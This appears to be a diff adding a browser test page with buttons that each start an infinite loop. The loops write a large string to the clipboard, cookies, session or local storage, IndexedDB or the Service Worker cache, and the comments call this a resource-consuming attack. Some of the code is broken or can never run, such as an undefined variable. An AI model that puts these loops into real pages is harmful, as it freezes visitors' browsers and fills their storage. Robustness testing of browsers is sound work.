@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Clipboard Read/Write, Cookies, Storage, IndexedDB, and Service Worker Cache</title>
+  <script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('/sw.js')
+        .then(registration => {
+          console.log('Service Worker registered successfully');
+        })
+        .catch(error => {
+          console.error('Service Worker registration failed:', error);
+        });
+    }
+
+    // Use DOM to launch resource-consuming operations
+    let largeText = '';
+    for (let i = 0; i < 100; i++) {
+      largeText += 'This is a large text.';
+      //console.log(largeText); // launch attack
+    }
+
+    // Use clipboard to launch resource-consuming operations
+    function writeToClipboard() {
+      while (true) {
+        navigator.clipboard.writeText(textToCopy)
+          .then(() => {
+
+          })
+          .catch(err => {
+
+          });
+      }
+    }
+
+    // Use cookies to launch resource-consuming operations
+    function writeCookie() {
+      while (true) {
+        document.cookie = `${largeText}=${largeText}`;
+      }
+    }
+
+    // Use session storage to launch resource-consuming operations
+    function writeToSessionStorage() {
+      while (true) {
+        sessionStorage.setItem(largeText, largeText);
+      }
+      sessionStorage.setItem(largeText, largeText);
+    }
+
+    // Use local storage to launch resource-consuming operations
+    function writeToLocalStorage() {
+      while (true) {
+        localStorage.setItem(largeText, largeText);
+      }
+    }
+
+    function writeToIndexedDB() {
+      var request = indexedDB.open("MyDatabase", 1);
+
+      // Handle database open success
+      request.onsuccess = function (event) {
+        var db = event.target.result;
+
+        // Start a transaction
+        var transaction = db.transaction(["MyObjectStore"], "readwrite");
+
+        // Get the object store
+        var objectStore = transaction.objectStore("MyObjectStore");
+
+        // Add data to the object store
+        let i = 1;
+        while (true) {
+          var data = { id: i, name: largeText };
+          var requestAdd = objectStore.add(data);
+          i++;
+        }
+
+        // Handle success or error of adding data
+        requestAdd.onsuccess = function (event) {
+          console.log("Data added successfully");
+        };
+
+        requestAdd.onerror = function (event) {
+          console.error("Error adding data", event.target.error);
+        };
+
+        // Close the transaction
+        transaction.oncomplete = function (event) {
+          console.log("Transaction completed");
+        };
+
+        transaction.onerror = function (event) {
+          console.error("Transaction error", event.target.error);
+        };
+      };
+
+      // Handle database open error
+      request.onerror = function (event) {
+        console.error("Error opening database", event.target.error);
+      };
+
+      // Handle database upgrade (creating object store)
+      request.onupgradeneeded = function (event) {
+        var db = event.target.result;
+
+        // Create an object store
+        var objectStore = db.createObjectStore("MyObjectStore", { keyPath: "id" });
+
+        console.log("Object store created");
+      };
+    }
+
+    function writeToServiceWorkerCache() {
+      if ('serviceWorker' in navigator && 'caches' in window) {
+        const cacheData = largeText;
+        caches.open('my_cache').then(function (cache) {
+          while (true) {
+            cache.put('my_data', new Response(cacheData));
+          }
+        });
+      } else {
+        console.error('Service Worker or Cache API is not supported.');
+      }
+    }
+  </script>
+</head>
+
+<body>
+  <h1>Clipboard Read/Write, Cookies, Storage, IndexedDB, and Service Worker Cache</h1>
+  <div>
+    <button onclick="writeToClipboard()">Launch Clipboard</button>
+  </div>
+  <div>
+    <button onclick="writeCookie()">Write Cookie</button>
+  </div>
+  <div>
+    <button onclick="writeToSessionStorage()">Write to Session Storage</button>
+  </div>
+  <div>
+    <button onclick="writeToLocalStorage()">Write to Local Storage</button>
+  </div>
+  <div>
+    <button onclick="writeToIndexedDB()">Write to IndexedDB</button>
+  </div>
+  <div>
+    <button onclick="writeToServiceWorkerCache()">Write to Service Worker Cache</button>
+  </div>
+</body>
+
+</html>
